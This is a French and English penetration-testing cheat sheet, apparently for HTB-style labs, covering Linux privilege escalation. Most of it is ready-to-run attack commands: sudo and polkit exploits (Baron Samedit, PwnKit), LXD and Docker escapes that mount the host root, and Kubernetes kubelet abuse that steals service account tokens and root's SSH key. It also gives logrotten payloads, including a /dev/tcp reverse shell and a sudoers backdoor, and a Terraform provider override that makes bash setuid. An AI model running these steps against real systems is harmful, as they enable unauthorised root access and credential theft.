
- [[#SUDO]]
- [[#POLKIT]]
- [[#LXC / LXD]]
- [[#DOCKER]]
- [[#KUBERNETES K8S]]
- [[#LOGROTATE]]
- [[#TERRAFORM]]

---
# SUDO

- [[#Baron Samedit (CVE-2021-3156) (ver 1.8.21, 1.8.31 & 1.8.27)]]
- [[#Sudo Policy Bypass ([CVE-2019-14287](https //www.sudo.ws/security/advisories/minus_1_uid/))(sudo < 1.8.28)]]


```shell-session
sudo -V | head -n1
```

## Baron Samedit (CVE-2021-3156) (ver 1.8.21, 1.8.31 & 1.8.27)

Buffer Overflow

Check (segmentation fault -> vulnerable)

```
sudoedit -s '\' `perl -e 'print "A" x 65536'`
```


https://github.com/blasty/CVE-2021-3156

```shell-session
make
```

```shell
./sudo-hax-me-a-sandwich
```

## Sudo Policy Bypass ([CVE-2019-14287](https://www.sudo.ws/security/advisories/minus_1_uid/))(sudo < 1.8.28)

> [!TIP]
> Necessite droit sudoer sur une commande

```bash
sudo -l
```

```bash
sudo -u#-1 <programme>
```


---
# POLKIT


```
pkexec --version | head -n1
```

```bash
apt list --installed | grep policykit
```


## PwnKit ( [CVE-2021-4034](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034)) (ver < 0.105-31)

> [!TIP]
> Necessite le setuid sur pkexec

https://github.com/arthepsy/CVE-2021-4034

```shell-session
gcc cve-2021-4034-poc.c -o poc
```

```
./poc
```


version en python -> https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py



---
# LXC / LXD

0. Unzip alpine image

```shell
unzip alpine.zip
```

1. Start the LXD initialization process. Choose the defaults for each prompt. Consult this [post](https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04) for more information on each step.

```bash
lxd init
```

2. Import the local image.

```
lxc image import alpine.tar.gz --alias alpine
```

3. Start a privileged container with the `security.privileged` set to `true` to run the container without a UID mapping, making the root user in the container the same as the root user on the host.

```
lxc init alpine r00t -c security.privileged=true
```

4. Mount the host file system.

```
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
```

5. spawn a shell inside the container instance.

```
lxc start r00t
```

6. Root shell

```
lxc exec r00t /bin/sh
```

```
ls -l /mnt/root
```


---
# DOCKER

- [[#Docker Group]]
- [[#Docker Sockets]]
- [[#Docker Escapes]]

## Docker Group

1. Identifier image docker

```shell-session
docker image ls
```

2. Monter conteneur en root avec / dans /mnt

```bash
docker run -v /:/mnt --rm -it <image> chroot /mnt sh
```


## Docker Sockets

> [!TIP]
> Si docker.sock modifiable, alors possible de lancer un conteneur root sans même être membre du groupe docker

```sh
find / -iname *docker.sock -type f 2>/dev/null
```

```sh
ls -la /var/run/docker.sock
```

```shell
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```



## Docker Escapes

### Creds hunting

Clé SSH ?

[[Credential Hunting#LINUX]]






---
# KUBERNETES #K8S

- [[#Control Plane]]
- [[#API Anonymous access]]
- [[#API Pods extraction]]
- [[#Kubeletctl - Extracting Pods]]
- [[#Kubelet API - Available Commands]]
- [[#Kubelet API - Executing Commands]]

- [[#Kubeletctl - PRIVESC]]


## Control Plane

The Control Plane serves as the management layer. It consists of several crucial components, including:

|**Service**|**TCP Ports**|
|---|---|
|`etcd`|`2379`, `2380`|
|`API server`|`6443`|
|`Scheduler`|`10251`|
|`Controller Manager`|`10252`|
|`Kubelet API`|`10250`|
|`Read-Only Kubelet API`|`10255`|

## API Anonymous access

```shell
curl https://<ip_k8s>:6443 -k
```

## API Pods extraction

> [!TIP]
> Enumère les names, namespaces, creation timestamps et container images des pods + dernière configuration appliqué qui peut contenir des details confidentiels

```shell-session
curl https://<ip_k8s>:10250/pods -k | jq .
```

## Kubeletctl - Extracting Pods

```shell
kubeletctl -i --server 10.129.10.11 pods
```

## Kubelet API - Available Commands

```shell
kubeletctl -i --server 10.129.10.11 scan rce
```

## Kubelet API - Executing Commands

```shell
kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx
```

## Kubeletctl - PRIVESC

1. Extraire token et certificats

```bash
kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
```

```sh
kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
```

2. Lister les privilèges

```sh
export token=`cat k8.token`
```

```sh
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list
```

3. Si privilèges GET CREATE et LIST sur pods alors possible de créer un conteneur et monter / dans /mnt/ par exemple

Privesc.yaml
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /mnt
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

4. Créer le pod

```shell
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml
```

5. Vérifier qu'il tourne

```shell
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods
```

6. Extraire clé privé RSA de root

```shell
kubeletctl --server 10.129.10.11 exec "cat /mnt/root/.ssh/id_rsa" -p privesc -c privesc
```




---
# LOGROTATE 

> [!TIP]
> Versions 3.8.6, 3.11, 3.15, 3.18 + permission d'écrire dans les fichiers de logs + logrotate lancé en root ou user privilégié ->  Vulnérable à Logrotten

Afficher version de logrotate

```sh
logrotate --version
```

Identifier les fichiers de logs modifiables

```sh
find /var/log -perm -o+w 2>/dev/null
```

```sh
find /var/log -perm -u+w -user <user> 2>/dev/null
```

```sh
find /var/log -perm -g+w -group <group> 2>/dev/null
```

```sh
find / -perm -u+w -user <user> -iname *.log 2>/dev/null
```


Afficher la conf globale de logrotate

```shell
cat /etc/logrotate.conf
```

Afficher les fichiers dont la rotation est active

```sh
cat /var/lib/logrotate.status
```

Autres fichiers de conf

```shell
ls /etc/logrotate.d/
```

Check si create 644 root root

```shell
cat /etc/logrotate.d/dpkg
```

## LogRotten

https://github.com/whotwagner/logrotten

1. Compiler l'exploit depuis la target ou un environnement similaire

```shell
gcc logrotten.c -o logrotten
```

2. Créer un payload

reverse shell
```shell
echo 'bash -i >& /dev/tcp/<ip>/9001 0>&1' > payload
```

/etc/passwd modifiable
```shell
echo 'chmod o+w /etc/passwd' > payload
```

Attribuer droits sudoers au user
```sh
echo 'echo "<user> ALL=NOPASSWD:ALL" >> /etc/sudoers' > payload
```


3. Identifier les options utilisées par logrotate (create ou compress)

```bash
grep "create\|compress" /etc/logrotate.conf | grep -v "#"
```

4. Exploit 

Option Create

```
./logrotten -p ./payload /path/to/writable_log_file.log
```

Option Compress

```
./logrotten -p ./payload -c -s 4 /path/to/writable_log_file.log
```


6. Forcer la rotation du fichier de log en écrivant dedans pour executer le payload

```sh
echo "a" >> /home/htb-student/backups/access.log | ./logrotten -p ./payload /home/htb-student/backups/access.log
```

Done! pour que ça soit ok

Attendre un peu le temps que logrotate soit executé en tant que root

---
# TERRAFORM

- [ ] [[#GTFOBin]]
- [ ] [[#Sudo exploit]]

## GTFOBin

https://gtfobins.github.io/gtfobins/terraform/

## Sudo exploit

https://dollarboysushil.com/posts/Terraform-Sudo-Exploit-Privilege-Escalation/

En partant du principe que l'utilisateur a le droit sudoer suivant, il est possible de créer un provider script malveillant afin d'exécuter du code arbitraire.

```sh
Matching Defaults entries for jeremy on previous:
    !env_reset, env_delete+=PATH, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jeremy may run the following commands on previous:
    (root) /usr/bin/terraform -chdir\=/opt/examples apply
```

1. Dans un premier temps identifier la source du provider (dans /opt/examples pour notre exemple)

```sh
cat /opt/examples/*.tf
terraform {
  required_providers {
    examples = {
      source = "previous.htb/terraform/examples"
...
```

2. Puis créer un provider script malveillant contenant notre payload et le rendre executable

```sh
echo '#!/bin/bash
chmod +s /bin/bash' > /tmp/exploit

chmod +x /tmp/exploit
```


3. Créer un fichier de configuration .rc afin d'override le provider_installation

```sh
echo 'provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/tmp"
  }
  direct {}
}' > /tmp/conf.rc
```

4. Exporter le fichier de configuration dans la variable d'environnement TF_CLI_CONFIG_FILE

```sh
export TF_CLI_CONFIG_FILE=/tmp/conf.rc
```

5. Executer la commande sudo. (Cela génère évidemment des erreurs)

```sh
sudo /usr/bin/terraform -chdir\=/opt/examples apply
```

6. Escalade en root

```sh
/bin/bash -p
```